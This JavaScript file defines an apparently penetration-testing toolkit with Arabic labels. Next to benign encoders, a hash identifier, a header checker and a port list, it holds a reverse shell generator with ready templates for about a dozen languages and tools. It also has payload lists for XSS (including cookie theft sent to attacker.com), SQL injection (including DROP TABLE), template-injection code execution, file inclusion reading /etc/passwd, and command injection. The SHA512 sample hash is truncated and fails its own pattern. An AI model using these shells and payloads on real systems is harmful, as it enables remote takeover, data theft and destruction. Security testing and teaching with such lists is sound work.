// ==================== SECURITY TOOLS ====================
// أدوات أمنية تفاعلية

const securityTools = {
    // Subdomain Finder
    subdomainFinder: {
        title: 'Subdomain Finder',
        titleAr: 'باحث النطاقات الفرعية',
        description: 'اكتشف النطاقات الفرعية للهدف',
        commonSubdomains: ['www', 'mail', 'ftp', 'admin', 'portal', 'api', 'dev', 'staging', 'test', 'beta', 'app', 'blog', 'shop', 'store', 'cdn', 'static', 'assets', 'img', 'images', 'media', 'files', 'download', 'upload', 'dashboard', 'panel', 'cpanel', 'webmail', 'secure', 'login', 'auth', 'sso', 'vpn', 'remote', 'intranet', 'internal', 'external', 'public', 'private', 'demo', 'docs', 'help', 'support', 'status', 'monitor', 'backup', 'db', 'database', 'sql', 'mysql', 'postgres', 'mongo', 'redis', 'elastic', 'search', 'git', 'gitlab', 'github', 'jenkins', 'ci', 'cd', 'deploy', 'prod', 'production', 'uat', 'qa', 'sandbox', 'stage', 'ns1', 'ns2', 'dns', 'mx', 'smtp', 'pop', 'imap', 'webdisk', 'autodiscover', 'exchange', 'm', 'mobile', 'ios', 'android', 'ws', 'socket', 'graphql', 'rest', 'v1', 'v2', 'old', 'new', 'legacy', 'archive']
    },

    // Reverse Shell Generator
    reverseShells: {
        title: 'Reverse Shell Generator',
        titleAr: 'مولد Reverse Shell',
        shells: [
            { name: 'Bash', icon: 'terminal', template: 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' },
            { name: 'Bash UDP', icon: 'terminal', template: 'bash -i >& /dev/udp/{IP}/{PORT} 0>&1' },
            { name: 'Python', icon: 'python', template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
            { name: 'Python3', icon: 'python', template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
            { name: 'PHP', icon: 'php', template: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'` },
            { name: 'Perl', icon: 'code', template: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
            { name: 'Ruby', icon: 'gem', template: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
            { name: 'Netcat', icon: 'network-wired', template: 'nc -e /bin/sh {IP} {PORT}' },
            { name: 'Netcat -c', icon: 'network-wired', template: 'nc -c sh {IP} {PORT}' },
            { name: 'Netcat mkfifo', icon: 'network-wired', template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f' },
            { name: 'PowerShell', icon: 'windows', template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
            { name: 'Java', icon: 'java', template: `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()` },
            { name: 'Socat', icon: 'link', template: 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}' }
        ]
    },

    // Payload Generator
    payloads: {
        title: 'Payload Generator',
        titleAr: 'مولد الحمولات',
        categories: [
            {
                name: 'XSS Payloads',
                nameAr: 'حمولات XSS',
                items: [
                    { name: 'Basic Alert', payload: '<script>alert(1)</script>' },
                    { name: 'IMG Onerror', payload: '<img src=x onerror=alert(1)>' },
                    { name: 'SVG Onload', payload: '<svg onload=alert(1)>' },
                    { name: 'Body Onload', payload: '<body onload=alert(1)>' },
                    { name: 'Input Onfocus', payload: '<input onfocus=alert(1) autofocus>' },
                    { name: 'Marquee', payload: '<marquee onstart=alert(1)>' },
                    { name: 'Details', payload: '<details open ontoggle=alert(1)>' },
                    { name: 'Cookie Steal', payload: '<script>fetch("http://attacker.com?c="+document.cookie)</script>' },
                    { name: 'DOM Location', payload: '<script>document.location="http://attacker.com?c="+document.cookie</script>' },
                    { name: 'Event Handler', payload: '" onmouseover="alert(1)' }
                ]
            },
            {
                name: 'SQLi Payloads',
                nameAr: 'حمولات SQLi',
                items: [
                    { name: 'Auth Bypass', payload: "' OR '1'='1" },
                    { name: 'Auth Bypass 2', payload: "' OR 1=1--" },
                    { name: 'Comment', payload: "admin'--" },
                    { name: 'Union Null', payload: "' UNION SELECT NULL--" },
                    { name: 'Union 2 Cols', payload: "' UNION SELECT NULL,NULL--" },
                    { name: 'Union 3 Cols', payload: "' UNION SELECT NULL,NULL,NULL--" },
                    { name: 'Time Blind', payload: "' AND SLEEP(5)--" },
                    { name: 'Error Based', payload: "' AND 1=CONVERT(int,@@version)--" },
                    { name: 'Boolean Blind', payload: "' AND 1=1--" },
                    { name: 'Stacked Query', payload: "'; DROP TABLE users--" }
                ]
            },
            {
                name: 'SSTI Payloads',
                nameAr: 'حمولات SSTI',
                items: [
                    { name: 'Jinja2 Test', payload: '{{7*7}}' },
                    { name: 'Jinja2 RCE', payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
                    { name: 'Twig Test', payload: '{{7*7}}' },
                    { name: 'Freemarker', payload: '${7*7}' },
                    { name: 'Velocity', payload: '#set($x=7*7)$x' },
                    { name: 'Smarty', payload: '{php}echo `id`;{/php}' }
                ]
            },
            {
                name: 'LFI/RFI Payloads',
                nameAr: 'حمولات LFI/RFI',
                items: [
                    { name: 'Basic LFI', payload: '../../../etc/passwd' },
                    { name: 'Null Byte', payload: '../../../etc/passwd%00' },
                    { name: 'Double Encode', payload: '..%252f..%252f..%252fetc/passwd' },
                    { name: 'PHP Wrapper', payload: 'php://filter/convert.base64-encode/resource=index.php' },
                    { name: 'Data Wrapper', payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=' },
                    { name: 'Expect', payload: 'expect://id' },
                    { name: 'Input', payload: 'php://input' }
                ]
            },
            {
                name: 'Command Injection',
                nameAr: 'حقن الأوامر',
                items: [
                    { name: 'Semicolon', payload: '; id' },
                    { name: 'Pipe', payload: '| id' },
                    { name: 'Backticks', payload: '`id`' },
                    { name: 'Dollar', payload: '$(id)' },
                    { name: 'Newline', payload: '%0a id' },
                    { name: 'AND', payload: '&& id' },
                    { name: 'OR', payload: '|| id' }
                ]
            }
        ]
    },

    // Encoding/Decoding
    encoders: {
        title: 'Encoder/Decoder',
        titleAr: 'ترميز/فك ترميز',
        types: [
            { id: 'base64', name: 'Base64' },
            { id: 'url', name: 'URL Encode' },
            { id: 'html', name: 'HTML Entities' },
            { id: 'hex', name: 'Hex' },
            { id: 'binary', name: 'Binary' },
            { id: 'rot13', name: 'ROT13' },
            { id: 'md5', name: 'MD5 Hash' },
            { id: 'sha1', name: 'SHA1 Hash' },
            { id: 'sha256', name: 'SHA256 Hash' }
        ]
    },

    // Hash Identifier
    hashIdentifier: {
        title: 'Hash Identifier',
        titleAr: 'محدد نوع الهاش',
        patterns: [
            { name: 'MD5', length: 32, regex: /^[a-f0-9]{32}$/i, example: 'd41d8cd98f00b204e9800998ecf8427e' },
            { name: 'SHA1', length: 40, regex: /^[a-f0-9]{40}$/i, example: 'da39a3ee5e6b4b0d3255bfef95601890afd80709' },
            { name: 'SHA256', length: 64, regex: /^[a-f0-9]{64}$/i, example: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
            { name: 'SHA512', length: 128, regex: /^[a-f0-9]{128}$/i, example: 'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce' },
            { name: 'NTLM', length: 32, regex: /^[a-f0-9]{32}$/i, example: '31d6cfe0d16ae931b73c59d7e0c089c0' },
            { name: 'MySQL 4.x', length: 16, regex: /^[a-f0-9]{16}$/i, example: '606717496665bcba' },
            { name: 'bcrypt', length: 60, regex: /^\$2[aby]?\$\d{2}\$.{53}$/i, example: '$2a$10$...' }
        ]
    },

    // Header Analyzer
    headerAnalyzer: {
        title: 'Security Headers Checker',
        titleAr: 'فاحص رؤوس الأمان',
        headers: [
            { name: 'Content-Security-Policy', importance: 'Critical', description: 'يمنع XSS و injection attacks' },
            { name: 'X-Frame-Options', importance: 'High', description: 'يمنع Clickjacking' },
            { name: 'X-Content-Type-Options', importance: 'Medium', description: 'يمنع MIME sniffing' },
            { name: 'Strict-Transport-Security', importance: 'Critical', description: 'يفرض HTTPS' },
            { name: 'X-XSS-Protection', importance: 'Low', description: 'فلتر XSS (قديم)' },
            { name: 'Referrer-Policy', importance: 'Medium', description: 'يتحكم في معلومات الإحالة' },
            { name: 'Permissions-Policy', importance: 'Medium', description: 'يتحكم في ميزات المتصفح' }
        ]
    },

    // Port Reference
    portReference: {
        title: 'Common Ports Reference',
        titleAr: 'مرجع المنافذ الشائعة',
        ports: [
            { port: 21, service: 'FTP', protocol: 'TCP' },
            { port: 22, service: 'SSH', protocol: 'TCP' },
            { port: 23, service: 'Telnet', protocol: 'TCP' },
            { port: 25, service: 'SMTP', protocol: 'TCP' },
            { port: 53, service: 'DNS', protocol: 'TCP/UDP' },
            { port: 80, service: 'HTTP', protocol: 'TCP' },
            { port: 110, service: 'POP3', protocol: 'TCP' },
            { port: 135, service: 'MSRPC', protocol: 'TCP' },
            { port: 139, service: 'NetBIOS', protocol: 'TCP' },
            { port: 143, service: 'IMAP', protocol: 'TCP' },
            { port: 443, service: 'HTTPS', protocol: 'TCP' },
            { port: 445, service: 'SMB', protocol: 'TCP' },
            { port: 993, service: 'IMAPS', protocol: 'TCP' },
            { port: 995, service: 'POP3S', protocol: 'TCP' },
            { port: 1433, service: 'MSSQL', protocol: 'TCP' },
            { port: 1521, service: 'Oracle', protocol: 'TCP' },
            { port: 3306, service: 'MySQL', protocol: 'TCP' },
            { port: 3389, service: 'RDP', protocol: 'TCP' },
            { port: 5432, service: 'PostgreSQL', protocol: 'TCP' },
            { port: 5900, service: 'VNC', protocol: 'TCP' },
            { port: 6379, service: 'Redis', protocol: 'TCP' },
            { port: 8080, service: 'HTTP Proxy', protocol: 'TCP' },
            { port: 8443, service: 'HTTPS Alt', protocol: 'TCP' },
            { port: 27017, service: 'MongoDB', protocol: 'TCP' }
        ]
    }
};

// Encoding Functions
function encodeBase64(str) { return btoa(unescape(encodeURIComponent(str))); }
function decodeBase64(str) { try { return decodeURIComponent(escape(atob(str))); } catch (e) { return 'Invalid Base64'; } }
function encodeURL(str) { return encodeURIComponent(str); }
function decodeURL(str) { try { return decodeURIComponent(str); } catch (e) { return 'Invalid URL encoding'; } }
function encodeHex(str) { return str.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }
function decodeHex(str) { return str.match(/.{2}/g)?.map(h => String.fromCharCode(parseInt(h, 16))).join('') || 'Invalid Hex'; }
function encodeBinary(str) { return str.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '); }
function decodeBinary(str) { return str.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''); }
function rot13(str) { return str.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)); }
function encodeHTML(str) { return str.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function decodeHTML(str) { const txt = document.createElement('textarea'); txt.innerHTML = str; return txt.value; }

// Hash Identification
function identifyHash(hash) {
    const results = [];
    for (const pattern of securityTools.hashIdentifier.patterns) {
        if (pattern.regex.test(hash)) {
            results.push(pattern.name);
        }
    }
    return results.length ? results : ['Unknown'];
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { securityTools };
}
